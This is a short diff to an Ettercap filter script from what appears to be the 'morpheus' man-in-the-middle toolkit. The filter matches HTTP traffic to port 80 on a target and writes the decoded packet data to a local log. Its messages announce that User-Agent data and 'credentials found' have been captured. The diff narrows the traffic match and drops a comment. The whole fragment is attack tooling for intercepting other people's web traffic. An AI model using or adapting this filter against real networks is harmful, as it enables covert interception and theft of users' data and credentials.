@@ -22,12 +22,14 @@
 # Report port 80 (tcp) traffic
 # And warn attacker that User-Agent has captured...
 #
-if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
+if (ip.proto == TCP && tcp.dst == 80) {
     msg("[morpheus] host:TaRgEt   [ ⊶  ]  port:80 HTTP ☆");
     msg("[morpheus] | status: User-Agent detected ☆");
     msg("[morpheus] |  info : credentials found, log stored ✔");
     msg("[morpheus] |  log  : morpheus/logs/UserAgent.log ✔");
     msg("[morpheus] |_ exec : PRESS Q TO QUIT ETTERCAP FRAMEWORK NOW...\n");
-    log(DECODED.data, "./UserAgent.log"); # note: morpheus/logs/UserAgent.log
+    log(DECODED.data, "./UserAgent.log");
 }
+
+
 
